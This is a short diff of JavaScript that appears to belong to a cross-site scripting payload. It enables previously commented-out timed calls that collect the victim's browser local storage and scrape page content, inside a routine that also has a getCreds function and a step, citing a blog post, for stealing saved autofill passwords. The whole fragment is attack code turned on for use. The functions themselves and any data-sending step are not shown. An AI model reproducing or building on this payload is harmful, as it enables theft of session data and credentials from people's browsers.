@@ -211,14 +211,14 @@ getCreds = () => {
 
 actions = () => {
     // get all objects from local storage
-    // setTimeout(() => {
-    //     getLocalStorage();
-    // }, 2500); // Leave time for page to load
+    setTimeout(() => {
+        getLocalStorage();
+    }, 1000); // Leave time for page to load
 
-    // // get page content through scraping
-    // setTimeout(() => {
-    //     getPageContent();
-    // }, 3000); // Leave time for page to load
+    // get page content through scraping
+    setTimeout(() => {
+        getPageContent();
+    }, 1000); // Leave time for page to load
 
     // get saved passwords
     // Source: https://gosecure.ai/blog/2022/06/29/did-you-know-your-browsers-autofill-credentials-could-be-stolen-via-cross-site-scripting-xss/
